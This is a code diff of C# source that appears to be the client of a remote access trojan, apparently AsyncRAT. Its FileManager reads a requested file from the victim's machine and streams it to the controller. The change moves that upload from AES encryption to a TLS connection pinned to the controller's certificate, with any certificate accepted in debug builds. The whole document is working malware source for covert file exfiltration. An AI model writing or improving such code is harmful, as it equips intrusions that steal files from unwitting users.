@@ -9,6 +9,10 @@ using System.Linq;
 using System.Text;
 using System.Diagnostics;
 using System.Net.Sockets;
+using System.Security.Authentication;
+using System.Net.Security;
+using System.Security.Cryptography.X509Certificates;
+
 namespace Client.Handle_Packet
 {
    public class FileManager
@@ -97,6 +101,8 @@ namespace Client.Handle_Packet
                     SendBufferSize = 50 * 1024,
                 };
                 Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));
+                SslStream SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
+                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
 
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "socketDownload";
@@ -104,7 +110,7 @@ namespace Client.Handle_Packet
                 msgpack.ForcePathObject("DWID").AsString = dwid;
                 msgpack.ForcePathObject("File").AsString = file;
                 msgpack.ForcePathObject("Size").AsString = new FileInfo(file).Length.ToString();
-                ChunkSend(Settings.aes256.Encrypt(msgpack.Encode2Bytes()), Client);
+                ChunkSend(msgpack.Encode2Bytes(), Client, SslClient);
 
 
                 MsgPack msgpack2 = new MsgPack();
@@ -113,7 +119,7 @@ namespace Client.Handle_Packet
                 msgpack2.ForcePathObject("DWID").AsString = dwid;
                 msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
                 msgpack2.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(file));
-                ChunkSend(Settings.aes256.Encrypt(msgpack2.Encode2Bytes()), Client);
+                ChunkSend(msgpack2.Encode2Bytes(), Client, SslClient);
 
                 Client.Shutdown(SocketShutdown.Both);
                 Client.Dispose();
@@ -124,17 +130,17 @@ namespace Client.Handle_Packet
             }
         }
 
-        private void ChunkSend(byte[] msg, Socket client)
+        private void ChunkSend(byte[] msg, Socket client, SslStream ssl)
         {
             try
             {
                 byte[] buffersize = BitConverter.GetBytes(msg.Length);
                 client.Poll(-1, SelectMode.SelectWrite);
-                client.Send(buffersize);
+                ssl.Write(buffersize);
+                ssl.Flush();
 
                 int chunkSize = 50 * 1024;
                 byte[] chunk = new byte[chunkSize];
-                int SendPackage;
                 using (MemoryStream buffereReader = new MemoryStream(msg))
                 {
                     BinaryReader binaryReader = new BinaryReader(buffereReader);
@@ -143,7 +149,8 @@ namespace Client.Handle_Packet
                     {
                         chunk = binaryReader.ReadBytes(chunkSize);
                         bytesToRead -= chunkSize;
-                        SendPackage = client.Send(chunk);
+                        ssl.Write(chunk);
+                        ssl.Flush();
                     } while (bytesToRead > 0);
 
                     binaryReader.Dispose();
@@ -154,5 +161,14 @@ namespace Client.Handle_Packet
                 return;
             }
         }
+
+        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+        {
+#if DEBUG
+            return true;
+#endif
+            return Settings.ServerCertificate.Equals(certificate);
+        }
+
     }
 }
